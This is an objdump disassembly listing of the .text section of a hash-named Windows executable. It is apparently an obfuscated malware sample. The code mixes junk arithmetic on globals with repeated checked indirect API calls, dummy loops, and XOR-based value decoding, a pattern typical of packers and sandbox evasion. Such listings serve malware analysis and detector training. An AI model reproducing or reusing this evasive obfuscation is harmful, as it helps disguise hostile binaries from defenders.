
52b1798b24f44aade3b7b1c35b1c34e81bb5064050eb5587668520184aa20f06.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x42d014,0x42a000
  401013:	push   esi
  401014:	movzx  esi,WORD PTR ds:0x429014
  40101b:	sub    DWORD PTR ds:0x42a018,esi
  401021:	mov    esi,DWORD PTR ds:0x42ed49
  401027:	push   0x8
  401029:	push   0x42e545
  40102e:	and    DWORD PTR ds:0x42c010,0x110f
  401038:	call   esi
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42a018,0x6e1c
  401046:	je     0x40105d
  40104c:	adc    DWORD PTR ds:0x42a014,0x429000
  401056:	xor    eax,eax
  401058:	jmp    0x4029a4
  40105d:	push   edi
  40105e:	push   0x42e555
  401063:	xor    edi,edi
  401065:	and    DWORD PTR ds:0x42c004,0x42d018
  40106f:	inc    edi
  401070:	push   edi
  401071:	push   edi
  401072:	call   DWORD PTR ds:0x42ed79
  401078:	xor    DWORD PTR ds:0x42d01c,0x429020
  401082:	test   eax,eax
  401084:	mov    DWORD PTR ds:0x42c004,0x42a7
  40108e:	je     0x4010a5
  401094:	xor    eax,eax
  401096:	mov    DWORD PTR ds:0x42a018,0x32e7
  4010a0:	jmp    0x4029a3
  4010a5:	sbb    DWORD PTR ds:0x42a010,0x2663
  4010af:	push   ebx
  4010b0:	and    DWORD PTR ds:0x42d008,0x0
  4010ba:	mov    ebx,DWORD PTR ds:0x42d008
  4010c0:	inc    ebx
  4010c1:	mov    DWORD PTR ds:0x42d008,ebx
  4010c7:	cmp    DWORD PTR ds:0x42d008,0xb
  4010ce:	jne    0x4010e4
  4010d4:	push   0x2cfb
  4010d9:	push   0x7de9
  4010de:	call   DWORD PTR ds:0x42ed35
  4010e4:	cmp    DWORD PTR ds:0x42d008,0xa
  4010eb:	jne    0x4010fe
  4010f1:	mov    ebx,DWORD PTR ds:0x42d008
  4010f7:	inc    ebx
  4010f8:	mov    DWORD PTR ds:0x42d008,ebx
  4010fe:	cmp    DWORD PTR ds:0x42d008,0x12
  401105:	jb     0x4010ba
  40110b:	mov    ebx,DWORD PTR ds:0x42ed4d
  401111:	push   0x42e565
  401116:	sub    DWORD PTR ds:0x429014,0x429020
  401120:	push   edi
  401121:	mov    DWORD PTR ds:0x42b01c,0x3048
  40112b:	push   edi
  40112c:	call   ebx
  40112e:	and    DWORD PTR ds:0x42c00c,0x5ead
  401138:	test   eax,eax
  40113a:	jne    0x401e1f
  401140:	push   0xc
  401142:	push   0x42e589
  401147:	adc    DWORD PTR ds:0x42c010,0x42d010
  401151:	call   esi
  401153:	test   eax,eax
  401155:	mov    DWORD PTR ds:0x42a01c,0x6b4c
  40115f:	jne    0x401e1f
  401165:	push   0x7
  401167:	push   0x42e59d
  40116c:	call   esi
  40116e:	xor    DWORD PTR ds:0x429028,0x6216
  401178:	test   eax,eax
  40117a:	jne    0x401e1f
  401180:	add    DWORD PTR ds:0x429004,0x14dc
  40118a:	push   0x8
  40118c:	and    DWORD PTR ds:0x42c00c,0x42a000
  401196:	push   0x42e5ad
  40119b:	add    DWORD PTR ds:0x42a018,0x317f
  4011a5:	call   esi
  4011a7:	test   eax,eax
  4011a9:	mov    DWORD PTR ds:0x42c014,0x304b
  4011b3:	jne    0x401e1f
  4011b9:	push   0x42e5bd
  4011be:	xor    DWORD PTR ds:0x42d014,0x42b004
  4011c8:	push   edi
  4011c9:	push   edi
  4011ca:	sub    DWORD PTR ds:0x429010,0x429028
  4011d4:	call   DWORD PTR ds:0x42ed79
  4011da:	not    DWORD PTR ds:0x42b000
  4011e0:	test   eax,eax
  4011e2:	mov    DWORD PTR ds:0x429008,0x4a9f
  4011ec:	jne    0x401e1f
  4011f2:	push   0x42e5cd
  4011f7:	push   edi
  4011f8:	adc    DWORD PTR ds:0x42d000,0x42900c
  401202:	push   edi
  401203:	call   ebx
  401205:	test   eax,eax
  401207:	jne    0x401e1f
  40120d:	xor    DWORD PTR ds:0x429000,0x429010
  401217:	push   0xc
  401219:	and    DWORD PTR ds:0x42b00c,0x6767
  401223:	push   0x42e5f1
  401228:	sub    DWORD PTR ds:0x42a010,0x429018
  401232:	call   esi
  401234:	sub    DWORD PTR ds:0x429010,0x42a010
  40123e:	test   eax,eax
  401240:	jne    0x401e1f
  401246:	push   0x7
  401248:	push   0x42e605
  40124d:	and    DWORD PTR ds:0x42c004,0x42b014
  401257:	call   esi
  401259:	test   eax,eax
  40125b:	mov    DWORD PTR ds:0x42c014,0x7e03
  401265:	jne    0x401e1f
  40126b:	and    DWORD PTR ds:0x429020,0x42d000
  401275:	push   0x8
  401277:	sbb    DWORD PTR ds:0x42a008,0x42901c
  401281:	push   0x42e615
  401286:	add    DWORD PTR ds:0x42c01c,0x42d010
  401290:	call   esi
  401292:	test   eax,eax
  401294:	mov    DWORD PTR ds:0x429008,0x7503
  40129e:	jne    0x401e1f
  4012a4:	push   0x42e625
  4012a9:	and    DWORD PTR ds:0x42d008,0x42c000
  4012b3:	push   edi
  4012b4:	push   edi
  4012b5:	call   DWORD PTR ds:0x42ed79
  4012bb:	or     DWORD PTR ds:0x42c01c,0x42d000
  4012c5:	test   eax,eax
  4012c7:	jne    0x401e1f
  4012cd:	add    DWORD PTR ds:0x42b018,0x42d004
  4012d7:	push   0x42e635
  4012dc:	and    DWORD PTR ds:0x42900c,0x42a018
  4012e6:	push   edi
  4012e7:	push   edi
  4012e8:	and    DWORD PTR ds:0x42c018,0x4f5c
  4012f2:	call   ebx
  4012f4:	xor    DWORD PTR ds:0x42b00c,0x577f
  4012fe:	test   eax,eax
  401300:	jne    0x401e1f
  401306:	push   0xc
  401308:	push   0x42e659
  40130d:	xor    DWORD PTR ds:0x429018,0x2dc5
  401317:	call   esi
  401319:	mov    DWORD PTR ds:0x42d014,0x790c
  401323:	test   eax,eax
  401325:	mov    DWORD PTR ds:0x42a014,0x2892
  40132f:	jne    0x401e1f
  401335:	sub    DWORD PTR ds:0x42d004,0x3ee1
  40133f:	push   0x7
  401341:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40134b:	push   0x42e66d
  401350:	and    DWORD PTR ds:0x42c018,0x42d014
  40135a:	call   esi
  40135c:	test   eax,eax
  40135e:	mov    DWORD PTR ds:0x429008,0x4095
  401368:	jne    0x401e1f
  40136e:	sub    DWORD PTR ds:0x42d008,0x42b000
  401378:	push   0x8
  40137a:	adc    DWORD PTR ds:0x42d018,0x42c00c
  401384:	push   0x42e67d
  401389:	xor    DWORD PTR ds:0x42c014,0x7b1e
  401393:	call   esi
  401395:	test   eax,eax
  401397:	mov    DWORD PTR ds:0x42c010,0x4421
  4013a1:	jne    0x401e1f
  4013a7:	push   0x42e68d
  4013ac:	xor    DWORD PTR ds:0x42d018,0x31e9
  4013b6:	push   edi
  4013b7:	push   edi
  4013b8:	dec    DWORD PTR ds:0x42b010
  4013be:	call   DWORD PTR ds:0x42ed79
  4013c4:	test   eax,eax
  4013c6:	mov    DWORD PTR ds:0x429008,0x30d5
  4013d0:	jne    0x401e1f
  4013d6:	push   0x42e69d
  4013db:	push   edi
  4013dc:	adc    DWORD PTR ds:0x42c018,0x42d014
  4013e6:	push   edi
  4013e7:	sbb    DWORD PTR ds:0x429024,0x42b00c
  4013f1:	call   ebx
  4013f3:	xor    DWORD PTR ds:0x42b004,0x3165
  4013fd:	test   eax,eax
  4013ff:	mov    DWORD PTR ds:0x429028,0x3c76
  401409:	jne    0x401e1f
  40140f:	push   0xc
  401411:	or     DWORD PTR ds:0x42d000,0x42c004
  40141b:	push   0x42e6c1
  401420:	call   esi
  401422:	test   eax,eax
  401424:	mov    DWORD PTR ds:0x42d01c,0x6bbc
  40142e:	jne    0x401e1f
  401434:	and    DWORD PTR ds:0x42c018,0x24ff
  40143e:	push   0x7
  401440:	push   0x42e6d5
  401445:	add    DWORD PTR ds:0x42c008,0x429024
  40144f:	call   esi
  401451:	adc    DWORD PTR ds:0x429008,0x42b004
  40145b:	test   eax,eax
  40145d:	jne    0x401e1f
  401463:	push   0x8
  401465:	push   0x42e6e5
  40146a:	or     DWORD PTR ds:0x42a00c,0x2f15
  401474:	call   esi
  401476:	test   eax,eax
  401478:	jne    0x401e1f
  40147e:	push   0x42e6f5
  401483:	push   edi
  401484:	add    DWORD PTR ds:0x42a008,0x52fe
  40148e:	push   edi
  40148f:	call   DWORD PTR ds:0x42ed79
  401495:	sub    DWORD PTR ds:0x429018,0x42c010
  40149f:	test   eax,eax
  4014a1:	mov    DWORD PTR ds:0x42d014,0x5fc2
  4014ab:	jne    0x401e1f
  4014b1:	push   0x42e705
  4014b6:	add    DWORD PTR ds:0x42b014,0x42a00c
  4014c0:	push   edi
  4014c1:	push   edi
  4014c2:	xor    DWORD PTR ds:0x42b00c,0x37e4
  4014cc:	call   ebx
  4014ce:	mov    DWORD PTR ds:0x429000,0x2bcb
  4014d8:	test   eax,eax
  4014da:	jne    0x401e1f
  4014e0:	push   0xc
  4014e2:	push   0x42e729
  4014e7:	call   esi
  4014e9:	and    DWORD PTR ds:0x42b000,0x6be4
  4014f3:	test   eax,eax
  4014f5:	mov    DWORD PTR ds:0x42b00c,0x4954
  4014ff:	jne    0x401e1f
  401505:	or     DWORD PTR ds:0x429004,0x2e1b
  40150f:	push   0x7
  401511:	push   0x42e73d
  401516:	neg    DWORD PTR ds:0x429018
  40151c:	call   esi
  40151e:	or     DWORD PTR ds:0x429004,0x7cc8
  401528:	test   eax,eax
  40152a:	mov    DWORD PTR ds:0x42a000,0x4af4
  401534:	jne    0x401e1f
  40153a:	sub    DWORD PTR ds:0x429020,0x6067
  401544:	push   0x8
  401546:	push   0x42e74d
  40154b:	call   esi
  40154d:	test   eax,eax
  40154f:	jne    0x401e1f
  401555:	xor    DWORD PTR ds:0x429008,0x42a00c
  40155f:	push   0x42e75d
  401564:	push   edi
  401565:	sbb    DWORD PTR ds:0x42a004,0x429028
  40156f:	push   edi
  401570:	adc    DWORD PTR ds:0x42c000,0x42b004
  40157a:	call   DWORD PTR ds:0x42ed79
  401580:	xor    DWORD PTR ds:0x42b01c,0x42d004
  40158a:	test   eax,eax
  40158c:	mov    DWORD PTR ds:0x429004,0x6f0c
  401596:	jne    0x401e1f
  40159c:	sbb    DWORD PTR ds:0x429010,0x42b010
  4015a6:	push   0x42e76d
  4015ab:	push   edi
  4015ac:	xor    DWORD PTR ds:0x42c000,0x17e1
  4015b6:	push   edi
  4015b7:	add    DWORD PTR ds:0x429024,0x42b018
  4015c1:	call   ebx
  4015c3:	sbb    DWORD PTR ds:0x42c004,0x42b018
  4015cd:	test   eax,eax
  4015cf:	jne    0x401e1f
  4015d5:	or     DWORD PTR ds:0x42d008,0x42d000
  4015df:	push   0xc
  4015e1:	push   0x42e791
  4015e6:	adc    DWORD PTR ds:0x42d01c,0x429000
  4015f0:	call   esi
  4015f2:	test   eax,eax
  4015f4:	jne    0x401e1f
  4015fa:	sbb    DWORD PTR ds:0x42b01c,0x35f4
  401604:	push   0x7
  401606:	adc    DWORD PTR ds:0x42d00c,0x4213
  401610:	push   0x42e7a5
  401615:	xor    DWORD PTR ds:0x42b01c,0x728b
  40161f:	call   esi
  401621:	test   eax,eax
  401623:	mov    DWORD PTR ds:0x429010,0x1355
  40162d:	jne    0x401e1f
  401633:	add    DWORD PTR ds:0x42c00c,0x42d000
  40163d:	push   0x8
  40163f:	sub    DWORD PTR ds:0x42d000,0x42a014
  401649:	push   0x42e7b5
  40164e:	xor    DWORD PTR ds:0x42900c,0x42a014
  401658:	call   esi
  40165a:	add    DWORD PTR ds:0x42d018,0x7270
  401664:	test   eax,eax
  401666:	jne    0x401e1f
  40166c:	xor    DWORD PTR ds:0x429028,0x318
  401676:	push   0x42e7c5
  40167b:	not    DWORD PTR ds:0x42b00c
  401681:	push   edi
  401682:	and    DWORD PTR ds:0x429024,0x42d004
  40168c:	push   edi
  40168d:	call   DWORD PTR ds:0x42ed79
  401693:	test   eax,eax
  401695:	jne    0x401e1f
  40169b:	push   0x42e7d5
  4016a0:	push   edi
  4016a1:	push   edi
  4016a2:	xor    DWORD PTR ds:0x42d004,0x42b004
  4016ac:	call   ebx
  4016ae:	sbb    DWORD PTR ds:0x42d01c,0x42a008
  4016b8:	test   eax,eax
  4016ba:	mov    DWORD PTR ds:0x42b008,0x59c6
  4016c4:	jne    0x401e1f
  4016ca:	mov    DWORD PTR ds:0x42a008,0x78fc
  4016d4:	push   0xc
  4016d6:	add    DWORD PTR ds:0x42900c,0x42c018
  4016e0:	push   0x42e7f9
  4016e5:	call   esi
  4016e7:	test   eax,eax
  4016e9:	jne    0x401e1f
  4016ef:	and    DWORD PTR ds:0x42d010,0x3029
  4016f9:	push   0x7
  4016fb:	xor    DWORD PTR ds:0x42d008,0x429020
  401705:	push   0x42e80d
  40170a:	call   esi
  40170c:	sub    DWORD PTR ds:0x42901c,0x49cd
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42900c,0x2477
  401722:	jne    0x401e1f
  401728:	push   0x8
  40172a:	push   0x42e81d
  40172f:	call   esi
  401731:	or     DWORD PTR ds:0x42c000,0x42b014
  40173b:	test   eax,eax
  40173d:	jne    0x401e1f
  401743:	sub    DWORD PTR ds:0x429018,0x4202
  40174d:	push   0x42e82d
  401752:	adc    DWORD PTR ds:0x42a000,0x15e
  40175c:	push   edi
  40175d:	push   edi
  40175e:	and    DWORD PTR ds:0x42d008,0x1b79
  401768:	call   DWORD PTR ds:0x42ed79
  40176e:	add    DWORD PTR ds:0x42b008,0x42c000
  401778:	test   eax,eax
  40177a:	mov    DWORD PTR ds:0x429004,0x4fab
  401784:	jne    0x401e1f
  40178a:	add    DWORD PTR ds:0x42b008,0x429018
  401794:	push   0x42e83d
  401799:	push   edi
  40179a:	adc    DWORD PTR ds:0x42d018,0x42b008
  4017a4:	push   edi
  4017a5:	call   ebx
  4017a7:	adc    DWORD PTR ds:0x42b01c,0x42a014
  4017b1:	test   eax,eax
  4017b3:	mov    DWORD PTR ds:0x42b008,0x413c
  4017bd:	jne    0x401e1f
  4017c3:	sub    DWORD PTR ds:0x42a004,0x429004
  4017cd:	push   0xc
  4017cf:	push   0x42e861
  4017d4:	sub    DWORD PTR ds:0x42b014,0x419d
  4017de:	call   esi
  4017e0:	sub    DWORD PTR ds:0x429014,0x429024
  4017ea:	test   eax,eax
  4017ec:	mov    DWORD PTR ds:0x42c018,0x3584
  4017f6:	jne    0x401e1f
  4017fc:	adc    DWORD PTR ds:0x42b014,0x3845
  401806:	push   0x7
  401808:	adc    DWORD PTR ds:0x42b014,0x5918
  401812:	push   0x42e875
  401817:	call   esi
  401819:	or     DWORD PTR ds:0x42b004,0x42a000
  401823:	test   eax,eax
  401825:	jne    0x401e1f
  40182b:	sub    DWORD PTR ds:0x42c010,0x7a9b
  401835:	push   0x8
  401837:	push   0x42e885
  40183c:	call   esi
  40183e:	or     DWORD PTR ds:0x42b018,0x42a018
  401848:	test   eax,eax
  40184a:	mov    DWORD PTR ds:0x42c018,0x6db6
  401854:	jne    0x401e1f
  40185a:	push   0x42e895
  40185f:	push   edi
  401860:	push   edi
  401861:	or     DWORD PTR ds:0x429024,0x42b004
  40186b:	call   DWORD PTR ds:0x42ed79
  401871:	test   eax,eax
  401873:	jne    0x401e1f
  401879:	push   0x42e8a5
  40187e:	mov    DWORD PTR ds:0x42d010,0x708e
  401888:	push   edi
  401889:	mov    DWORD PTR ds:0x42c01c,0x7ef
  401893:	push   edi
  401894:	call   ebx
  401896:	test   eax,eax
  401898:	mov    DWORD PTR ds:0x42a00c,0x3b87
  4018a2:	jne    0x401e1f
  4018a8:	mov    DWORD PTR ds:0x429004,0x503
  4018b2:	push   0xc
  4018b4:	xor    DWORD PTR ds:0x42c00c,0x6b3b
  4018be:	push   0x42e8c9
  4018c3:	call   esi
  4018c5:	test   eax,eax
  4018c7:	mov    DWORD PTR ds:0x42a004,0x812
  4018d1:	jne    0x401e1f
  4018d7:	push   0x7
  4018d9:	sub    DWORD PTR ds:0x42b000,0x42a00c
  4018e3:	push   0x42e8dd
  4018e8:	sub    DWORD PTR ds:0x42d008,0x6a91
  4018f2:	call   esi
  4018f4:	add    DWORD PTR ds:0x429000,0x3ce6
  4018fe:	test   eax,eax
  401900:	mov    DWORD PTR ds:0x42d018,0x1a2
  40190a:	jne    0x401e1f
  401910:	sub    DWORD PTR ds:0x42a008,0x42a010
  40191a:	push   0x8
  40191c:	push   0x42e8ed
  401921:	call   esi
  401923:	sub    DWORD PTR ds:0x42d00c,0x42900c
  40192d:	test   eax,eax
  40192f:	mov    DWORD PTR ds:0x429000,0x18ec
  401939:	jne    0x401e1f
  40193f:	sbb    DWORD PTR ds:0x42a01c,0x42a004
  401949:	push   0x42e8fd
  40194e:	adc    DWORD PTR ds:0x42c010,0x1027
  401958:	push   edi
  401959:	adc    DWORD PTR ds:0x42d014,0x61c0
  401963:	push   edi
  401964:	xor    DWORD PTR ds:0x42d004,0x42b000
  40196e:	call   DWORD PTR ds:0x42ed79
  401974:	and    DWORD PTR ds:0x42b00c,0x54e0
  40197e:	test   eax,eax
  401980:	jne    0x401e1f
  401986:	mov    DWORD PTR ds:0x42b014,0x48d
  401990:	push   0x42e90d
  401995:	xor    DWORD PTR ds:0x42b00c,0x429000
  40199f:	push   edi
  4019a0:	xor    DWORD PTR ds:0x42c008,0x7d0d
  4019aa:	push   edi
  4019ab:	and    DWORD PTR ds:0x42b010,0xad4
  4019b5:	call   ebx
  4019b7:	adc    DWORD PTR ds:0x42b01c,0x42d018
  4019c1:	test   eax,eax
  4019c3:	mov    DWORD PTR ds:0x42a00c,0x2f29
  4019cd:	jne    0x401e1f
  4019d3:	sub    DWORD PTR ds:0x42a010,0x429014
  4019dd:	push   0xc
  4019df:	add    DWORD PTR ds:0x42d004,0x38f3
  4019e9:	push   0x42e931
  4019ee:	sub    DWORD PTR ds:0x42d008,0x531f
  4019f8:	call   esi
  4019fa:	xor    DWORD PTR ds:0x42a00c,0x1332
  401a04:	test   eax,eax
  401a06:	jne    0x401e1f
  401a0c:	add    DWORD PTR ds:0x42d014,0x42b000
  401a16:	push   0x7
  401a18:	push   0x42e945
  401a1d:	adc    DWORD PTR ds:0x429028,0x23cf
  401a27:	call   esi
  401a29:	test   eax,eax
  401a2b:	jne    0x401e1f
  401a31:	push   0x8
  401a33:	add    DWORD PTR ds:0x429020,0x607a
  401a3d:	push   0x42e955
  401a42:	call   esi
  401a44:	or     DWORD PTR ds:0x42c000,0x42b00c
  401a4e:	test   eax,eax
  401a50:	mov    DWORD PTR ds:0x42c00c,0x4ca0
  401a5a:	jne    0x401e1f
  401a60:	sub    DWORD PTR ds:0x429000,0x42d010
  401a6a:	push   0x42e965
  401a6f:	push   edi
  401a70:	and    DWORD PTR ds:0x42901c,0x42a004
  401a7a:	push   edi
  401a7b:	xor    DWORD PTR ds:0x42b018,0x42a008
  401a85:	call   DWORD PTR ds:0x42ed79
  401a8b:	adc    DWORD PTR ds:0x42d004,0x42901c
  401a95:	test   eax,eax
  401a97:	mov    DWORD PTR ds:0x42c010,0x64f7
  401aa1:	jne    0x401e1f
  401aa7:	push   0x42e975
  401aac:	mov    DWORD PTR ds:0x42a014,0x62f7
  401ab6:	push   edi
  401ab7:	push   edi
  401ab8:	call   ebx
  401aba:	add    DWORD PTR ds:0x42a018,0x42d01c
  401ac4:	test   eax,eax
  401ac6:	mov    DWORD PTR ds:0x42c01c,0x72ca
  401ad0:	jne    0x401e1f
  401ad6:	mov    DWORD PTR ds:0x42c01c,0x7760
  401ae0:	push   0xc
  401ae2:	sub    DWORD PTR ds:0x42b018,0x3ed8
  401aec:	push   0x42e999
  401af1:	call   esi
  401af3:	test   eax,eax
  401af5:	mov    DWORD PTR ds:0x42d018,0x4329
  401aff:	jne    0x401e1f
  401b05:	push   0x7
  401b07:	push   0x42e9ad
  401b0c:	call   esi
  401b0e:	add    DWORD PTR ds:0x42b01c,0x42d008
  401b18:	test   eax,eax
  401b1a:	jne    0x401e1f
  401b20:	add    DWORD PTR ds:0x42a008,0x5e0b
  401b2a:	push   0x8
  401b2c:	sub    DWORD PTR ds:0x429018,0x42a00c
  401b36:	push   0x42e9bd
  401b3b:	call   esi
  401b3d:	test   eax,eax
  401b3f:	mov    DWORD PTR ds:0x42d008,0x514f
  401b49:	jne    0x401e1f
  401b4f:	sbb    DWORD PTR ds:0x42b000,0x42d000
  401b59:	push   0x42e9cd
  401b5e:	xor    DWORD PTR ds:0x42c018,0x40e4
  401b68:	push   edi
  401b69:	add    DWORD PTR ds:0x42b010,0x42c000
  401b73:	push   edi
  401b74:	add    DWORD PTR ds:0x42d004,0x42c010
  401b7e:	call   DWORD PTR ds:0x42ed79
  401b84:	mov    DWORD PTR ds:0x42a000,0x51c5
  401b8e:	test   eax,eax
  401b90:	mov    DWORD PTR ds:0x42b000,0x17c8
  401b9a:	jne    0x401e1f
  401ba0:	and    DWORD PTR ds:0x42d014,0x42d010
  401baa:	push   0x42e9dd
  401baf:	push   edi
  401bb0:	push   edi
  401bb1:	call   ebx
  401bb3:	sbb    DWORD PTR ds:0x429010,0x42b014
  401bbd:	test   eax,eax
  401bbf:	mov    DWORD PTR ds:0x42c01c,0x73a3
  401bc9:	jne    0x401e1f
  401bcf:	xor    DWORD PTR ds:0x42c01c,0x6e0
  401bd9:	push   0xc
  401bdb:	adc    DWORD PTR ds:0x429008,0x42c008
  401be5:	push   0x42ea01
  401bea:	adc    DWORD PTR ds:0x42901c,0x2688
  401bf4:	call   esi
  401bf6:	add    DWORD PTR ds:0x42c008,0x63eb
  401c00:	test   eax,eax
  401c02:	mov    DWORD PTR ds:0x429004,0x7742
  401c0c:	jne    0x401e1f
  401c12:	adc    DWORD PTR ds:0x42c014,0x42b008
  401c1c:	push   0x7
  401c1e:	adc    DWORD PTR ds:0x42c008,0x42b010
  401c28:	push   0x42ea15
  401c2d:	call   esi
  401c2f:	test   eax,eax
  401c31:	mov    DWORD PTR ds:0x42900c,0x5c79
  401c3b:	jne    0x401e1f
  401c41:	adc    DWORD PTR ds:0x42d008,0x429000
  401c4b:	push   0x8
  401c4d:	xor    DWORD PTR ds:0x42c008,0x42b014
  401c57:	push   0x42ea25
  401c5c:	sub    DWORD PTR ds:0x42d000,0x42b01c
  401c66:	call   esi
  401c68:	xor    DWORD PTR ds:0x429008,0x42a00c
  401c72:	test   eax,eax
  401c74:	jne    0x401e1f
  401c7a:	push   0x42ea35
  401c7f:	adc    DWORD PTR ds:0x429020,0x1586
  401c89:	push   edi
  401c8a:	push   edi
  401c8b:	and    DWORD PTR ds:0x429008,0x42a014
  401c95:	call   DWORD PTR ds:0x42ed79
  401c9b:	and    DWORD PTR ds:0x42a01c,0x429000
  401ca5:	test   eax,eax
  401ca7:	jne    0x401e1f
  401cad:	push   0x42ea45
  401cb2:	push   edi
  401cb3:	sub    DWORD PTR ds:0x42d000,0x429000
  401cbd:	push   edi
  401cbe:	call   ebx
  401cc0:	test   eax,eax
  401cc2:	jne    0x401e1f
  401cc8:	push   0xc
  401cca:	push   0x42ea69
  401ccf:	sbb    DWORD PTR ds:0x42a004,0x42a014
  401cd9:	call   esi
  401cdb:	test   eax,eax
  401cdd:	mov    DWORD PTR ds:0x42a018,0x57a5
  401ce7:	jne    0x401e1f
  401ced:	sub    DWORD PTR ds:0x42d018,0x45f
  401cf7:	push   0x7
  401cf9:	push   0x42ea7d
  401cfe:	call   esi
  401d00:	test   eax,eax
  401d02:	mov    DWORD PTR ds:0x42a010,0x77f7
  401d0c:	jne    0x401e1f
  401d12:	adc    DWORD PTR ds:0x42a008,0x42900c
  401d1c:	push   0x8
  401d1e:	sub    DWORD PTR ds:0x429008,0x429014
  401d28:	push   0x42ea8d
  401d2d:	and    DWORD PTR ds:0x429008,0x429018
  401d37:	call   esi
  401d39:	test   eax,eax
  401d3b:	mov    DWORD PTR ds:0x429000,0x2cbb
  401d45:	jne    0x401e1f
  401d4b:	and    DWORD PTR ds:0x42d01c,0x42b000
  401d55:	push   0x42ea9d
  401d5a:	or     DWORD PTR ds:0x42b010,0x58c8
  401d64:	push   edi
  401d65:	or     DWORD PTR ds:0x42c00c,0x42a00c
  401d6f:	push   edi
  401d70:	adc    DWORD PTR ds:0x42b004,0x42a01c
  401d7a:	call   DWORD PTR ds:0x42ed79
  401d80:	and    DWORD PTR ds:0x429020,0x42b000
  401d8a:	test   eax,eax
  401d8c:	jne    0x401e1f
  401d92:	or     DWORD PTR ds:0x42c01c,0x42b01c
  401d9c:	push   0x42eaad
  401da1:	push   edi
  401da2:	push   edi
  401da3:	call   ebx
  401da5:	sbb    DWORD PTR ds:0x42901c,0x42c01c
  401daf:	test   eax,eax
  401db1:	mov    DWORD PTR ds:0x429018,0x129d
  401dbb:	jne    0x401e1f
  401dc1:	sbb    DWORD PTR ds:0x42a004,0x14a1
  401dcb:	push   0xc
  401dcd:	push   0x42ead1
  401dd2:	call   esi
  401dd4:	sbb    DWORD PTR ds:0x42c00c,0x67e3
  401dde:	test   eax,eax
  401de0:	mov    DWORD PTR ds:0x42c014,0x5d4a
  401dea:	jne    0x401e1f
  401df0:	sbb    DWORD PTR ds:0x42c00c,0x7769
  401dfa:	push   0x7
  401dfc:	or     DWORD PTR ds:0x42b00c,0x1035
  401e06:	push   0x42eae5
  401e0b:	call   esi
  401e0d:	test   eax,eax
  401e0f:	mov    DWORD PTR ds:0x42d014,0xf4
  401e19:	je     0x401e3a
  401e1f:	sub    DWORD PTR ds:0x42b01c,0x42b000
  401e29:	xor    eax,eax
  401e2b:	mov    DWORD PTR ds:0x42c018,0x7f86
  401e35:	jmp    0x4029a2
  401e3a:	or     esi,DWORD PTR ds:0x429020
  401e40:	mov    DWORD PTR [ebp-0x10],0x0
  401e47:	movzx  esi,BYTE PTR ds:0x42d010
  401e4e:	add    DWORD PTR ds:0x42c004,esi
  401e54:	mov    eax,DWORD PTR [ebp-0x24]
  401e57:	dec    esi
  401e58:	mov    DWORD PTR [ebp-0x24],eax
  401e5b:	mov    ecx,0xf89c85b5
  401e60:	mov    edi,DWORD PTR ds:0x411fc4
  401e66:	mov    esi,DWORD PTR ds:0x411f58
  401e6c:	sub    esi,edi
  401e6e:	imul   edi,DWORD PTR [edi+esi*1]
  401e72:	mov    DWORD PTR [ebp-0x8],ecx
  401e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  401e7c:	and    DWORD PTR ds:0x42a004,0x0
  401e86:	jmp    0x401e98
  401e8b:	mov    edi,DWORD PTR ds:0x42a004
  401e91:	inc    edi
  401e92:	mov    DWORD PTR ds:0x42a004,edi
  401e98:	cmp    DWORD PTR ds:0x42a004,0x1c
  401e9f:	jae    0x401ed2
  401ea5:	cmp    DWORD PTR ds:0x42a004,0x25
  401eac:	jne    0x401ec3
  401eb2:	push   DWORD PTR [ebp-0x14]
  401eb5:	push   0x42a004
  401eba:	push   DWORD PTR [ebp-0x1c]
  401ebd:	call   DWORD PTR ds:0x42ed39
  401ec3:	jmp    0x401e8b
  401ec8:	sbb    DWORD PTR ds:0x42d000,0x3f97
  401ed2:	lea    eax,[ebp-0x34]
  401ed5:	mov    DWORD PTR [ebp-0x28],eax
  401ed8:	mov    esi,DWORD PTR ds:0x429018
  401ede:	and    esi,DWORD PTR ds:0x42901c
  401ee4:	mov    DWORD PTR ds:0x429018,esi
  401eea:	lea    eax,[ebp-0x30]
  401eed:	mov    DWORD PTR [ebp-0x1c],eax
  401ef0:	sub    DWORD PTR ds:0x429018,0x2a07
  401efa:	mov    eax,ds:0x42e435
  401eff:	mov    eax,DWORD PTR [eax+0x1c8]
  401f05:	or     DWORD PTR ds:0x429028,0x42b010
  401f0f:	mov    eax,DWORD PTR [eax]
  401f11:	mov    edx,DWORD PTR [ebp-0x1c]
  401f14:	mov    esi,0x7510896
  401f19:	adc    DWORD PTR ds:0x429014,edi
  401f1f:	xor    eax,esi
  401f21:	mov    edi,0x3272dd
  401f26:	add    eax,edi
  401f28:	mov    DWORD PTR ds:0x42d008,0xdc
  401f32:	mov    DWORD PTR [edx],eax
  401f34:	mov    eax,ds:0x42b000
  401f39:	mov    eax,ds:0x42ebcd
  401f3e:	cmp    eax,0x312bc9f6
  401f43:	jne    0x40206d
  401f49:	xor    eax,0x6ec6
  401f4e:	mov    eax,DWORD PTR [ebp-0x8]
  401f51:	mov    edx,DWORD PTR ds:0x42e435
  401f57:	or     DWORD PTR ds:0x42901c,0x3e24
  401f61:	mov    edx,DWORD PTR [edx+0x198]
  401f67:	or     DWORD PTR ds:0x42b018,edx
  401f6d:	xor    eax,esi
  401f6f:	and    ebx,0x7b5c
  401f75:	add    eax,edi
  401f77:	and    DWORD PTR ds:0x429028,0x0
  401f81:	jmp    0x401f93
  401f86:	mov    ebx,DWORD PTR ds:0x429028
  401f8c:	inc    ebx
  401f8d:	mov    DWORD PTR ds:0x429028,ebx
  401f93:	cmp    DWORD PTR ds:0x429028,0x10
  401f9a:	jae    0x401fc8
  401fa0:	cmp    DWORD PTR ds:0x429028,0x12
  401fa7:	jne    0x401fbd
  401fad:	push   0x42e010
  401fb2:	push   0x42e0c5
  401fb7:	call   DWORD PTR ds:0x42ed3d
  401fbd:	jmp    0x401f86
  401fc2:	sub    DWORD PTR ds:0x42c014,edx
  401fc8:	mov    DWORD PTR [edx],eax
  401fca:	sbb    DWORD PTR ds:0x42c014,edi
  401fd0:	mov    eax,DWORD PTR [ebp-0x8]
  401fd3:	mov    DWORD PTR ds:0x42c018,0x1d
  401fdd:	cmp    DWORD PTR ds:0x42c018,0x0
  401fe4:	je     0x402064
  401fea:	cmp    DWORD PTR ds:0x42c018,0x26
